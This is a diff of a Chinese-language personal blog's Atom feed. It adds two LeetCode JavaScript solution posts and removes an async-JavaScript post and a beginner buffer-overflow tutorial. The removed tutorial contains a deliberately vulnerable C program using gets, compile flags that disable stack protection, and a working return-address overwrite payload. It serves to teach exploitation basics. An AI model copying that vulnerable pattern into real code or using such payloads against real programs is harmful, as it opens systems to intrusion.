@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://jeno5980515.github.io/"/>
-  <updated>2017-08-30T01:20:27.000Z</updated>
+  <updated>2017-08-31T03:42:31.000Z</updated>
   <id>http://jeno5980515.github.io/</id>
   
   <author>
@@ -14,6 +14,65 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>[LeetCode] 54 - Spiral Matrix</title>
+    <link href="http://jeno5980515.github.io/2017/08/31/Online%20Judge/LeetCode/54%20-%20Spiral%20Matrix/"/>
+    <id>http://jeno5980515.github.io/2017/08/31/Online Judge/LeetCode/54 - Spiral Matrix/</id>
+    <published>2017-08-31T03:33:23.000Z</published>
+    <updated>2017-08-31T03:42:31.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="題意"><a href="#題意" class="headerlink" title="題意"></a>題意</h1><p>模擬繞圈遍歷矩陣。</p>
+<a id="more"></a>
+<h1 id="程式"><a href="#程式" class="headerlink" title="程式"></a>程式</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * @param &#123;number[][]&#125; matrix</div><div class="line"> * @return &#123;number[]&#125;</div><div class="line"> */</div><div class="line"><span class="keyword">var</span> spiralOrder = <span class="function"><span class="keyword">function</span>(<span class="params">matrix</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> ( matrix.length === <span class="number">0</span> ) <span class="keyword">return</span> [];</div><div class="line">  <span class="keyword">let</span> bool = matrix.slice().map(<span class="function"><span class="params">rows</span> =&gt;</span> rows.map(<span class="function"><span class="params">el</span> =&gt;</span> <span class="literal">false</span>));</div><div class="line">  <span class="keyword">let</span> result = [];</div><div class="line">  <span class="keyword">let</span> currentDir = <span class="string">'e'</span>;</div><div class="line">  <span class="keyword">const</span> dirs = [<span class="string">'e'</span>, <span class="string">'s'</span>, <span class="string">'w'</span>, <span class="string">'n'</span>, <span class="string">'e'</span>];</div><div class="line">  <span class="keyword">const</span> dxs = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>];</div><div class="line">  <span class="keyword">const</span> dys = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>];</div><div class="line">    </div><div class="line">  <span class="keyword">const</span> checkValid = <span class="function">(<span class="params">x, y, dir</span>) =&gt;</span> &#123;</div><div class="line">    <span class="keyword">switch</span>(dir)&#123;</div><div class="line">      <span class="keyword">case</span> <span class="string">'e'</span>: <span class="keyword">return</span> y &lt; bool[x].length - <span class="number">1</span> &amp;&amp; !bool[x][y+<span class="number">1</span>];</div><div class="line">      <span class="keyword">case</span> <span class="string">'s'</span>: <span class="keyword">return</span> x &lt; bool.length - <span class="number">1</span> &amp;&amp; !bool[x+<span class="number">1</span>][y];</div><div class="line">      <span class="keyword">case</span> <span class="string">'w'</span>: <span class="keyword">return</span> y &gt;= <span class="number">1</span> &amp;&amp; !bool[x][y<span class="number">-1</span>];</div><div class="line">      <span class="keyword">case</span> <span class="string">'n'</span>: <span class="keyword">return</span> x &gt;= <span class="number">1</span> &amp;&amp; !bool[x<span class="number">-1</span>][y];</div><div class="line">    &#125;</div><div class="line">  &#125;  </div><div class="line">    </div><div class="line">  <span class="keyword">const</span> loop = <span class="function">(<span class="params">x ,y, dir</span>) =&gt;</span> &#123;</div><div class="line">    <span class="keyword">if</span> ( bool[x][y] ) <span class="keyword">return</span> ;</div><div class="line">    </div><div class="line">    bool[x][y] = <span class="literal">true</span>;</div><div class="line">    result.push(matrix[x][y]);</div><div class="line"></div><div class="line">    <span class="keyword">let</span> dirIndex = dirs.indexOf(dir);</div><div class="line">    </div><div class="line">    <span class="keyword">if</span>( !checkValid(x, y, dir) )&#123;</div><div class="line">      dirIndex ++ ;</div><div class="line">      <span class="keyword">if</span> ( checkValid(x, y, dirs[dirIndex]) )&#123;</div><div class="line">        loop(x + dxs[dirIndex], y + dys[dirIndex], dirs[dirIndex]);</div><div class="line">      &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      loop(x + dxs[dirIndex], y + dys[dirIndex], dir);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  loop(<span class="number">0</span>, <span class="number">0</span>, dirs[<span class="number">0</span>]);</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;題意&quot;&gt;&lt;a href=&quot;#題意&quot; class=&quot;headerlink&quot; title=&quot;題意&quot;&gt;&lt;/a&gt;題意&lt;/h1&gt;&lt;p&gt;模擬繞圈遍歷矩陣。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Online Judge" scheme="http://jeno5980515.github.io/categories/Online-Judge/"/>
+    
+      <category term="LeetCode" scheme="http://jeno5980515.github.io/categories/Online-Judge/LeetCode/"/>
+    
+    
+      <category term="LeetCode" scheme="http://jeno5980515.github.io/tags/LeetCode/"/>
+    
+      <category term="54" scheme="http://jeno5980515.github.io/tags/54/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>[LeetCode] 151 - Reverse Words in a String</title>
+    <link href="http://jeno5980515.github.io/2017/08/31/Online%20Judge/LeetCode/151%20-%20Reverse%20Words%20in%20a%20String/"/>
+    <id>http://jeno5980515.github.io/2017/08/31/Online Judge/LeetCode/151 - Reverse Words in a String/</id>
+    <published>2017-08-31T02:59:00.000Z</published>
+    <updated>2017-08-31T03:35:46.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="題意"><a href="#題意" class="headerlink" title="題意"></a>題意</h1><p>反轉句子，並去除多餘空白。</p>
+<a id="more"></a>
+<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>利用內建函式可以快速反轉並組合，必須要用 <code>filter</code> 去除多餘的空白。</p>
+<h1 id="程式"><a href="#程式" class="headerlink" title="程式"></a>程式</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * @param &#123;string&#125; str</div><div class="line"> * @returns &#123;string&#125;</div><div class="line"> */</div><div class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> str.split(<span class="string">' '</span>).filter(<span class="function">(<span class="params">el</span>) =&gt;</span> el !== <span class="string">''</span> ).reverse().join(<span class="string">' '</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;題意&quot;&gt;&lt;a href=&quot;#題意&quot; class=&quot;headerlink&quot; title=&quot;題意&quot;&gt;&lt;/a&gt;題意&lt;/h1&gt;&lt;p&gt;反轉句子，並去除多餘空白。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Online Judge" scheme="http://jeno5980515.github.io/categories/Online-Judge/"/>
+    
+      <category term="LeetCode" scheme="http://jeno5980515.github.io/categories/Online-Judge/LeetCode/"/>
+    
+    
+      <category term="LeetCode" scheme="http://jeno5980515.github.io/tags/LeetCode/"/>
+    
+      <category term="151" scheme="http://jeno5980515.github.io/tags/151/"/>
+    
+  </entry>
   
   <entry>
     <title>[Pwnable.kr] fd</title>
@@ -929,83 +988,6 @@
       <category term="Web" scheme="http://jeno5980515.github.io/tags/Web/"/>
     
       <category term="Performance" scheme="http://jeno5980515.github.io/tags/Performance/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[JavaScript] 非同步事件處理</title>
-    <link href="http://jeno5980515.github.io/2017/04/07/Programming%20Language/JavaScript/%E9%9D%9E%E5%90%8C%E6%AD%A5%E4%BA%8B%E4%BB%B6%E8%99%95%E7%90%86/"/>
-    <id>http://jeno5980515.github.io/2017/04/07/Programming Language/JavaScript/非同步事件處理/</id>
-    <published>2017-04-07T15:46:26.000Z</published>
-    <updated>2017-04-14T13:22:17.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>許久沒更新網誌了，開始上班剛好是個好時機重新經營。</p>
-<p>最近又遇到非同步事件的問題，雖然寫過但一遇到還是卡住，因此紀錄一下做法。</p>
-<a id="more"></a>
-<h1 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h1><p>假設我們現在有三個事件要進行並取得結果<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> tasks = [task1, task2, task3];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">task1</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'task 1 done'</span>);</div><div class="line">    callback(<span class="number">1</span>);</div><div class="line">  &#125;, <span class="number">500</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">task2</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'task 2 done'</span>);</div><div class="line">    callback(<span class="number">2</span>);</div><div class="line">  &#125;, <span class="number">400</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">task3</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'task 3 done'</span>);</div><div class="line">    callback(<span class="number">3</span>);</div><div class="line">  &#125;, <span class="number">300</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> obj = &#123;&#125; ;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getResult</span>(<span class="params">result</span>)</span>&#123;</div><div class="line">	obj.result = result ;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="依序執行"><a href="#依序執行" class="headerlink" title="依序執行"></a>依序執行</h2><p>利用遞迴以及紀錄次數<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sequential</span>(<span class="params">tasks,callback</span>) </span>&#123;</div><div class="line">	<span class="keyword">var</span> index = <span class="number">0</span> ;</div><div class="line">	<span class="keyword">var</span> resultList = [] ;</div><div class="line">	(<span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params"></span>)</span>&#123;</div><div class="line">		<span class="keyword">if</span> ( index &lt; tasks.length )&#123;</div><div class="line">			tasks[index++](<span class="function"><span class="keyword">function</span>(<span class="params">el</span>)</span>&#123;</div><div class="line">				resultList.push(el);</div><div class="line">				next(tasks);</div><div class="line">			&#125;);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			callback(resultList);</div><div class="line">		&#125;</div><div class="line">	&#125;)();</div><div class="line">&#125;</div><div class="line"></div><div class="line">sequential(tasks,getResult);</div></pre></td></tr></table></figure></p>
-<h2 id="同時進行"><a href="#同時進行" class="headerlink" title="同時進行"></a>同時進行</h2><p>紀錄事件狀態及紀錄完成次數<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">parallel</span>(<span class="params">tasks , callback</span>) </span>&#123;</div><div class="line">	<span class="keyword">var</span> resultList = [] , resultCount = <span class="number">0</span> ;</div><div class="line">	resultList.length = tasks.length ;</div><div class="line">	<span class="keyword">for</span> ( <span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; tasks.length ; i ++ )&#123;</div><div class="line">		tasks[i](<span class="function"><span class="keyword">function</span>(<span class="params">el</span>)</span>&#123;</div><div class="line">			resultList[i] = el ;</div><div class="line">			resultCount ++ ;</div><div class="line">			<span class="keyword">if</span> ( resultCount &gt;= tasks.length )&#123;</div><div class="line">				callback(resultList) ;</div><div class="line">			&#125;</div><div class="line">		&#125;);</div><div class="line">	&#125; </div><div class="line">&#125;</div><div class="line"></div><div class="line">parallel(tasks,getResult);</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;許久沒更新網誌了，開始上班剛好是個好時機重新經營。&lt;/p&gt;
-&lt;p&gt;最近又遇到非同步事件的問題，雖然寫過但一遇到還是卡住，因此紀錄一下做法。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Programming Language" scheme="http://jeno5980515.github.io/categories/Programming-Language/"/>
-    
-      <category term="JavaScript" scheme="http://jeno5980515.github.io/categories/Programming-Language/JavaScript/"/>
-    
-    
-      <category term="JavaScript" scheme="http://jeno5980515.github.io/tags/JavaScript/"/>
-    
-      <category term="Flow Control" scheme="http://jeno5980515.github.io/tags/Flow-Control/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[Security] Buffer Overflow</title>
-    <link href="http://jeno5980515.github.io/2015/12/11/Security/Buffer%20Overflow/"/>
-    <id>http://jeno5980515.github.io/2015/12/11/Security/Buffer Overflow/</id>
-    <published>2015-12-11T08:53:17.000Z</published>
-    <updated>2017-04-14T13:30:22.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>Buffer Overflow</code>是最基礎也是最常見的漏洞攻擊，以下是在<code>x86</code>執行的實作範例。</p>
-<a id="more"></a>
-<h1 id="程式"><a href="#程式" class="headerlink" title="程式"></a>程式</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</div><div class="line">	system(<span class="string">"/bin/sh"</span>) ;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">exec</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>] ;</div><div class="line">	<span class="built_in">puts</span>(<span class="string">"What's your name?"</span>) ;</div><div class="line">	gets(buf);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Hi !! %s\n"</span>,buf) ;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	exec();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>這是一支簡單的讀入輸出的程式碼，但注意到由於<code>buf</code>只有10個byte的空間，所以一旦輸入大於10個byte的字串就有可能造成意外。</p>
-<h1 id="Stack-Smashing"><a href="#Stack-Smashing" class="headerlink" title="Stack Smashing"></a>Stack Smashing</h1><p>普遍編譯器都會提供<code>Stack Smashing</code>的保護，但為了簡單示範在編譯時將保護關掉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -c -fno-stack-protector test.c</div><div class="line">gcc -o test test.o</div></pre></td></tr></table></figure></p>
-<h1 id="攻擊"><a href="#攻擊" class="headerlink" title="攻擊"></a>攻擊</h1><p>假設程式碼中剛剛好有你想執行的函式，如此一來我們只要取得函式的位置後利用overflow蓋過去欲執行的位置即可。</p>
-<h1 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h1><p>我們可以利用gdb來debugger<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb ./test</div></pre></td></tr></table></figure></p>
-<p>查看main的stack分佈<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) disas main</div></pre></td></tr></table></figure></p>
-<p>得知在<code>*main+6</code>的位置執行<code>exec</code>函式，因此我們先在這邊設一個<code>Break Point</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) b *main+6</div></pre></td></tr></table></figure></p>
-<p>再來我們查看exec<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) disas exec</div></pre></td></tr></table></figure></p>
-<p>找到在<code>*exec+49</code>的位置return，因此在這邊設一個<code>Break Point</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) b *exec+49</div></pre></td></tr></table></figure></p>
-<p>接著運行程式碼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) r</div></pre></td></tr></table></figure></p>
-<p>由於呼叫函式會將接下來欲執行的程式位置push進堆疊，所以我們可以看到目前stack最上層就是呼叫完函式後欲執行的位置，也是我們欲覆蓋過去的地方。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) x/wx $esp</div></pre></td></tr></table></figure></p>
-<p>繼續執行程式碼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) c</div></pre></td></tr></table></figure></p>
-<p>接下來查看要塞幾個byte才能覆蓋到該位置，在這裡我們利用每個字母四個為一組來測試。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xxxxxxxxxxAAAABBBBCCCCDDDDEEEEFFFF</div></pre></td></tr></table></figure></p>
-<p>在第二個break point查看esp。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) x/wx $esp</div></pre></td></tr></table></figure></p>
-<p>得到位置為<code>0x44444444</code>，也就是<code>DDDD</code>的部分，因此我們需要在DDDD的部分放進想執行的位置，現在來查看欲執行的函式位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) disas *exec</div></pre></td></tr></table></figure></p>
-<p>得到位置為<code>0x080484ad</code>，因此可以得到我們的攻擊字串，由於是<code>little endian</code>所以記得將位置相反。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -ne &quot;xxxxxxxxxxAAAABBBBCCCC\xad\x84\x04\x08\n&quot; &gt; s</div></pre></td></tr></table></figure></p>
-<p>再將字串丟進程式運行則可以發現執行到覆蓋的部分了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat s - | ./test</div></pre></td></tr></table></figure></p>
-<h1 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h1><p>這只是展示最簡單的<code>Buffer Overflow</code>運行原理，不過一般情況會有許多的保護機制，也不太可能這麼剛好塞了特別的函式讓你運行，其餘的方法待之後學習紀錄。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;code&gt;Buffer Overflow&lt;/code&gt;是最基礎也是最常見的漏洞攻擊，以下是在&lt;code&gt;x86&lt;/code&gt;執行的實作範例。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Security" scheme="http://jeno5980515.github.io/categories/Security/"/>
-    
-    
-      <category term="Security" scheme="http://jeno5980515.github.io/tags/Security/"/>
-    
-      <category term="C" scheme="http://jeno5980515.github.io/tags/C/"/>
     
   </entry>
   
